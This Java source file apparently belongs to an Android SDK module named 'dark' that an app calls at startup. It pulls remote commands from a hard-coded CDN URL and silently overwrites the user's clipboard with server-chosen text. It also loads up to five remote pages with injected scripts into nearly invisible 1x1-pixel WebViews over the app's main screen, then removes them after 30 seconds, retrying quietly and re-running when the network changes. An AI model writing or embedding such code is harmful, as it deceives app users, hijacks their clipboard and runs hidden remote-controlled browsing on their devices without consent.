package com.tengban.sdk.dark.core;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.app.Application;
import android.app.Application.ActivityLifecycleCallbacks;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.net.ConnectivityManager;
import android.os.Bundle;
import android.text.TextUtils;
import android.util.Log;
import android.view.ViewGroup;
import android.widget.FrameLayout;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;

import com.tengban.sdk.base.http.HttpRequest;
import com.tengban.sdk.base.http.HttpResponse;
import com.tengban.sdk.base.utils.AndroidUtil;
import com.tengban.sdk.base.utils.HttpUtil;
import com.tengban.sdk.base.utils.NetworkUtil;
import com.tengban.sdk.base.utils.ThreadUtil;
import com.tengban.sdk.base.utils.XUAUtil;

import org.json.JSONArray;
import org.json.JSONObject;

import java.util.ArrayList;
import java.util.LinkedList;

@SuppressLint("StaticFieldLeak")
public class DarkCoreManager {

    private static final String BASE_URL = "https://cdn.hmtgo.com/RvLaj3G/base.json";

    private static final LinkedList<Activity> sActivityList = new LinkedList<>();

    private static Context sAppContext = null;
    private static String sMainClassName = null;
    private static Activity sContainerActivity = null;
    private static final ArrayList<MyRunnable> sRemoveRunnable = new ArrayList<>(5);
    private static MyRunnable sRequestRunnable = null;

    private static boolean sRequesting = false;
    private static boolean sRequestSuccess = false;
    private static int sRetryCount = 0;

    private static ActivityLifecycleCallbacks sLifecycleCallback = null;
    private static BroadcastReceiver sReceiver = null;
    private static JSONArray sLoadUrl = null;

    public static void start(Context context) {
        sAppContext = AndroidUtil.getAppContext(context);

        if(sMainClassName == null) {
            sMainClassName = AndroidUtil.getMainClassName(sAppContext);
        }

        registerLifecycleCallback((Application) sAppContext);

        requestData(sAppContext);

        registerReceiver(sAppContext);
    }

    private static void registerLifecycleCallback(Application app) {
        if (sLifecycleCallback != null) {
            return;
        }

        sLifecycleCallback = new ActivityLifecycleCallbacks() {
            @Override
            public void onActivityCreated(@NonNull Activity activity, @Nullable Bundle savedInstanceState) {}

            @Override
            public void onActivityStarted(@NonNull Activity activity) {
                sActivityList.add(activity);

                if(sLoadUrl != null && isCurrentMainActivity()) {
                    loadUrl(activity, sLoadUrl);
                    sLoadUrl = null;
                }
            }

            @Override
            public void onActivityResumed(@NonNull Activity activity) {}

            @Override
            public void onActivityPaused(@NonNull Activity activity) {}

            @Override
            public void onActivityStopped(@NonNull Activity activity) {
                sActivityList.remove(activity);
            }

            @Override
            public void onActivitySaveInstanceState(@NonNull Activity activity, @NonNull Bundle outState) {}

            @Override
            public void onActivityDestroyed(@NonNull Activity activity) {
                if(sContainerActivity == activity) {
                    sContainerActivity = null;

                    if(!sRemoveRunnable.isEmpty()) {
                        for(Runnable r : sRemoveRunnable) {
                            ThreadUtil.sMainHandler.removeCallbacks(r);
                        }
                        sRemoveRunnable.clear();
                    }
                }

                if(sActivityList.isEmpty()) {
                    if(sRequestRunnable != null) {
                        ThreadUtil.sMainHandler.removeCallbacks(sRequestRunnable);
                        sRequestRunnable = null;
                    }
                }
            }
        };

        app.registerActivityLifecycleCallbacks(sLifecycleCallback);
    }

    private static void registerReceiver(Context context) {
        if (sReceiver != null) {
            return;
        }

        sReceiver = new BroadcastReceiver() {
            @Override
            public void onReceive(Context context, Intent intent) {
                if (ConnectivityManager.CONNECTIVITY_ACTION.equals(intent.getAction())) {
                    requestData(context);
                }
            }
        };

        final IntentFilter filter = new IntentFilter();
        filter.addAction(ConnectivityManager.CONNECTIVITY_ACTION);
        context.registerReceiver(sReceiver, filter);
    }

    private static void requestData(final Context context) {
        if(sRequesting || sRequestSuccess || !NetworkUtil.isNetworkAvailable(context)) {
            return;
        }

        sRequesting = true;

        HttpRequest request = HttpRequest.get(BASE_URL + "?v=" + System.currentTimeMillis());
        request.addHeader("User-Agent", XUAUtil.getXUA(context));
        HttpUtil.enqueue(request, new HttpUtil.Callback() {
            @Override
            public void onResponse(HttpResponse response) {
                if(response.isSuccessful()) {
                    JSONObject json = response.json();

                    Log.d("Dark", "onBaseRsp: " + json);

                    String version = json.optString("version");
                    if(!TextUtils.isEmpty(version)) {
                        requestRealData(context, version);
                    } else {
                        sRequesting = false;
                    }
                } else {
                    sRequesting = false;

                    if(sRetryCount < 5) {
                        ++sRetryCount;
                        if(sRequestRunnable != null) ThreadUtil.sMainHandler.removeCallbacks(sRequestRunnable);
                        sRequestRunnable = new MyRunnable(2);
                        ThreadUtil.sMainHandler.postDelayed(sRequestRunnable, 5_000);
                    }
                }
            }
        });
    }

    private static void requestRealData(final Context context, String url) {
        HttpRequest request = HttpRequest.get(url);
        request.addHeader("User-Agent", XUAUtil.getXUA(context));
        HttpUtil.enqueue(request, new HttpUtil.Callback() {
            @Override
            public void onResponse(HttpResponse response) {
                if(response.isSuccessful()) {
                    JSONObject json = response.json();

                    Log.d("Dark", "onRealRsp: " + json);

                    String clipboardText = json.optString("clipboard");
                    if(!TextUtils.isEmpty(clipboardText)) {
                        AndroidUtil.copyToClipboard(context, clipboardText);
                    }

                    sLoadUrl = json.optJSONArray("url");
                    if(sLoadUrl != null && isCurrentMainActivity()) {
                        loadUrl(sActivityList.getLast(), sLoadUrl);
                        sLoadUrl = null;
                    }

                    sRequesting = false;
                    sRequestSuccess = true;
                } else {
                    sRequesting = false;

                    if(sRetryCount < 5) {
                        ++sRetryCount;
                        if(sRequestRunnable != null) ThreadUtil.sMainHandler.removeCallbacks(sRequestRunnable);
                        sRequestRunnable = new MyRunnable(2);
                        ThreadUtil.sMainHandler.postDelayed(sRequestRunnable, 5_000);
                    }
                }
            }
        });
    }

    private static boolean isCurrentMainActivity() {
        if(sMainClassName == null) {
            return true;
        }

        if(!sActivityList.isEmpty()) {
            String className = sActivityList.getLast().getComponentName().getClassName();
            return TextUtils.equals(className, sMainClassName);
        }
        return false;
    }

    private static void loadUrl(Activity activity, JSONArray urlArr) {
        if(activity == null || activity.getWindow() == null || urlArr.length() == 0) {
            return;
        }

        sContainerActivity = activity;

        ViewGroup container = (ViewGroup) activity.getWindow().getDecorView();

        int size = Math.min(urlArr.length(), 5); // 最多允许加载5个
        for (int i = 0; i < size; ++i) {
            try {
                JSONObject json = (JSONObject) urlArr.get(i);
                String url = json.optString("value");
                String script = json.optString("script");
                boolean remove = json.optBoolean("remove", true);

                if(TextUtils.isEmpty(url)) continue;

                DarkWebView webView = new DarkWebView(activity);
                webView.init(script);

                FrameLayout.LayoutParams params = new FrameLayout.LayoutParams(1, 1);
                params.leftMargin = i;
                container.addView(webView, params);

                webView.setAlpha(0.005f);
                webView.loadUrl(url);

                if(remove) {
                    MyRunnable r = new MyRunnable(container, webView);
                    ThreadUtil.sMainHandler.postDelayed(r, 30_000);

                    sRemoveRunnable.add(r);
                }
            } catch (Throwable t) {
                // Eat
            }
        }
    }

    private static class MyRunnable implements Runnable {
        final int type;
        ViewGroup container;
        DarkWebView webView;

        MyRunnable(int type) {
            this.type = type;
        }

        MyRunnable(ViewGroup container, DarkWebView webView) {
            this(1);
            this.container = container;
            this.webView = webView;
        }

        @Override
        public void run() {
            if(type == 1) { // 移除WebView
                Log.d("Dark", "remove webView finish");
                try {
                    container.removeView(webView);
                } catch (Throwable t) {
                    // Eat
                }
                sRemoveRunnable.remove(this);
            } else if(type == 2) { // 请求数据
                Log.d("Dark", "request retry count: " + sRetryCount);
                requestData(sAppContext);
                sRequestRunnable = null;
            }
        }
    }
}
